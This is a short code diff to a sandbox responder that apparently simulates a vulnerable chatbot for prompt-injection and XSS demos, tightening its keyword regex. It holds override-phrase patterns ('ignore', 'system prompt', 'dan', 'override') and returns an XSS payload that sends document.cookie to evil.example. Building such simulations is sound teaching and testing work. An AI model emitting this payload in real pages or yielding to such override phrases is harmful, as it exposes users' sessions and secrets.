@@ -33,8 +33,10 @@ export function sandboxRespond(probe: Probe): string {
 
 export function sandboxCustomRespond(payload: string) {
   const p = payload.toLowerCase();
+  // Word-bounded so "shipping", "tokenize", or "abundance" don't trigger a dump.
   const wantsLeak =
-    /ignore|system prompt|pin|stripe|token|dan|override|internal/.test(p);
+    /\b(ignore|pin|stripe|token|dan|override|internal)\b/.test(p) ||
+    /system prompt/.test(p);
   const wantsXss = /<script|onerror|document\.cookie/.test(p);
   if (wantsXss) {
     return `<img src=x onerror="document.location='https://evil.example/c='+document.cookie">`;
